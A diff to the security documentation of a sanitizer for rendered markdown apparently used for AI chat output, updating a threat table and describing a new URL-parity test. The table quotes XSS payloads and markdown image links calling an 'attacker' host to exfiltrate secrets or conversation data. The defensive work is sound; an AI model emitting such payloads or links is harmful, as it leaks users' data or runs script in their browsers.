@@ -149,7 +149,7 @@ Always removed, in every mode: `script`, `style`, `template`, `iframe`, `object`
 | Threat | Example | Default outcome | Mechanism | Test |
 | --- | --- | --- | --- | --- |
 | Script execution through markup | `<script>`, `<img onerror>`, `<svg onload>` | blocked | DOMPurify HTML profile; `on*` tripwire in `afterSanitizeAttributes` | `sanitize.test.ts` |
-| Script execution through a URL | `javascript:`, `vbscript:`, `data:text/html`, entity-encoded and control-character variants | blocked | scheme allowlist on every URL attribute, applied after HTML decoding and browser-style normalization | `sanitize.test.ts`, `regressions.test.ts` #1 |
+| Script execution through a URL | `javascript:`, `vbscript:`, `data:text/html`, entity-encoded and control-character variants | blocked | scheme allowlist on every URL attribute, resolved against the page exactly as the browser resolves it | `sanitize.test.ts`, `regressions.test.ts` #1, `e2e/url-parity.mjs` |
 | Data exfiltration without a click | `![](https://attacker/?q=secret)` | blocked | image host allowlist (empty by default), query stripping, sink denylist, path entropy check | `policy.test.ts`, `regressions.test.ts` #5 |
 | Exfiltration through an allowed host | `https://cdn.example/<base64 conversation>.png` | blocked | length and entropy heuristics on path and query tokens | `regressions.test.ts` #5 |
 | Exfiltration during streaming | `![](https://attacker/lea` rendered mid-stream | never requested | link, image, autolink, tag and reference-definition withholding until the URL closes | `stream.test.ts`, `e2e/run.mjs` |
@@ -203,6 +203,7 @@ The browser proof in `e2e/run.mjs` loads the demo under exactly that header and 
 - `e2e/run.mjs`: the naive panel executes the payload and requests attacker hosts, the policy panel does neither; zero violations under `require-trusted-types-for 'script'`; a streamed image URL is requested exactly once, after it is complete.
 - `packages/angular/e2e/run.mjs`: a standalone Angular application over the ng-packagr bundle; the directive and the streaming component render through the policy, write no `innerHTML` anywhere in the application, keep settled nodes across streaming updates, and run under Trusted Types enforcement.
 - `e2e/site.mjs`: the static Pages build behaves the same without server headers.
+- `e2e/url-parity.mjs`: URL classification against Chromium's own parser on 115,810 generated strings (schemes in every spelling, control characters at every position, look-alike separators, backslashes, double schemes, hosts with credentials and confusables): every string the browser resolves to a scheme outside the allowlist is blocked, every allowed one agrees with the browser on scheme and hostname, nothing survives sanitization with a disallowed scheme, and nothing the browser accepts is over-blocked.
 
 ```
 npm ci
